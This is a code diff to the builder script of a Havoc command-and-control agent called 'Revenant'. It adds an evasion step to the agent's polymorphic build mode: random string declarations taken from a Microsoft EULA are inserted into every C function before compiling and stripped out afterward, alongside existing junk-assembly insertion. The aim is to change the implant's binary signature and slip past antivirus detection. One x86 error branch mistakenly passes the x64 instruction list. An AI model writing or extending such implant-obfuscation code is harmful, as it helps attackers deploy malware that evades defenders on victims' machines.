@@ -10,6 +10,7 @@ from base64 import b64decode
 from havoc.service import HavocService
 from havoc.agent import *
 
+
 def generate_command_constants():
     COMMAND_REGISTER = random.randint(0, 0xFFFF)
     COMMAND_GET_JOB = random.randint(0, 0xFFFF)
@@ -128,6 +129,35 @@ instructions_x64 = [
     "pop rcx;" \
     "popfq;"''
 ]
+
+eula = ["MICROSOFT SOFTWARE LICENSE TERMS", \
+        "(MVLTECHNOLOGIES1.0 – STABLE CHANNEL)", \
+        "MICROSOFT VISUAL STUDIO COMMUNITY 2019", \
+        "These license terms are an agreement between", \
+        "Microsoft Corporation (or based on where you live,", \
+        "one of its affiliates) and you. Please read them.", \
+        "They apply to the software named above, which", \
+        "includes the media on which you received it, if", \
+        "any. The terms also apply to any Microsoft", \
+        "updates,", "supplements,", "Internet-based services,", \
+        "and support services", "for", "this software, unless", \
+        "other terms accompany those items. If so, those", \
+        "terms apply.", "BY USING THE SOFTWARE, YOU ACCEPT", \
+        "THESE TERMS. IF YOU DO NOT ACCEPT THEM, DO NOT", \
+        "USE THE SOFTWARE. INSTEAD, RETURN IT TO THE", \
+        "RESELLER FOR A REFUND OR CREDIT.", "As described", \
+        "below,", "using the software also operates as your", \
+        "consent", "to the transmission of certain", \
+        "computer", "information", "for Internet-based", \
+        "services,", "as", "described", "in the privacy", \
+        "statement", "described in Section 3. If you", \
+        "comply with these license terms, you have the", \
+        "rights below.", "1. INSTALLATION AND USE RIGHTS.", \
+        "a. Individual license. If you are an individual", \
+        "working on your own applications to sell or for", \
+        "any other purpose,", "you may use the software to", \
+        "develop", "and test", "those applications."]
+
 
 plain_function_strings = [
     "#define DeviceIoControl_CRC32B                 \"DeviceIoControl\"",
@@ -422,7 +452,7 @@ class Revenant(AgentType):
         if config['Options']['Arch'] == "64":
 
             if config['Config']['Polymorphic']:
-                process_directory(directory_path, instructions_x64, False)
+                process_directory(directory_path, instructions_x64, eula, False)
                 print("[*] Configuring source files x64...")
 
             compile_command: str = "cmake -DARCH=x64 . && cmake --build . -j 1"
@@ -436,14 +466,14 @@ class Revenant(AgentType):
                                          universal_newlines=True)
 
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x64, True)
+                    process_directory(directory_path, instructions_x64, eula, True)
                     print("[*] Cleaning up source files...")
 
                 print(process.stdout)
             except subprocess.CalledProcessError as error:
                 print(f"Error occurred: {error.stderr}")
 
-                if config['Config']['Polymorphic']:
+                if config['Config']['Polymorphic']: # Retain poly for debugging
                     #process_directory(directory_path, instructions_x64, True)
                     print("[*] !! NOT Cleaning up source files !!")
 
@@ -454,7 +484,7 @@ class Revenant(AgentType):
             compile_command: str = "cmake -DARCH=x86 . && cmake --build . -j 1"
 
             if config['Config']['Polymorphic']:
-                process_directory(directory_path, instructions_x86, False)
+                process_directory(directory_path, instructions_x86, eula, False)
                 print("[*] Configuring source files x86...")
 
             try:
@@ -466,7 +496,7 @@ class Revenant(AgentType):
                                          universal_newlines=True)
 
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x86, True)
+                    process_directory(directory_path, instructions_x86, eula, True)
                     print("[*] Cleaning up source files...")
 
                 print(process.stdout)
@@ -474,7 +504,7 @@ class Revenant(AgentType):
                 print(f"Error occurred: {error.stderr}")
 
                 if config['Config']['Polymorphic']:
-                    process_directory(directory_path, instructions_x86, True)
+                    process_directory(directory_path, instructions_x64, eula, True)
                     print("[*] Cleaning up source files...")
 
                 return
@@ -619,25 +649,51 @@ def remove_asm_statements(file_contents):
     return modified_contents
 
 
-def process_c_file(file_path, instructions, remove=False):
+
+def insert_string_declarations(file_contents, eula):
+    function_pattern = re.compile(
+        r"(?P<return_type>[\w\s\*]+)\s+(?P<func_name>\w+)\s*\((?P<params>[^\)]*)\)\s*\{",
+        re.MULTILINE
+    )
+
+    def insert_string(match):
+        num_statements = random.randint(1, 50)
+        string_statements = "\n".join(
+            "//remove me\nchar *str{} = \"{}\";".format(random.randint(10000, 99999), random.choice(eula)) for _ in range(num_statements)
+        )
+        return match.group(0) + "\n" + string_statements
+
+    modified_contents = function_pattern.sub(insert_string, file_contents)
+
+    return modified_contents
+
+def remove_string_declarations(file_contents):
+    # Regex pattern to match and remove lines after "//remove me" comments
+    remove_pattern = re.compile(r"//remove me\nchar \*str\d+ = \".*?\";\n?", re.MULTILINE)
+    modified_contents = remove_pattern.sub("", file_contents)
+    return modified_contents
+
+
+def process_c_file(file_path, instructions, eula, remove=False):
     with open(file_path, 'r') as input_file:
         file_contents = input_file.read()
 
     if remove:
         modified_contents = remove_asm_statements(file_contents)
+        modified_contents = remove_string_declarations(modified_contents)
     else:
         modified_contents = insert_asm_statements(file_contents, instructions)
+        modified_contents = insert_string_declarations(modified_contents, eula)
 
     with open(file_path, 'w') as output_file:
         output_file.write(modified_contents)
 
 
-def process_directory(directory_path, instructions, remove=False):
+def process_directory(directory_path, instructions, eula, remove=False):
     for filename in os.listdir(directory_path):
         if filename.endswith('.c'):
             file_path = os.path.join(directory_path, filename)
-            process_c_file(file_path, instructions, remove)
-
+            process_c_file(file_path, instructions, eula, remove)
 
 def main():
     write_command_header_file()
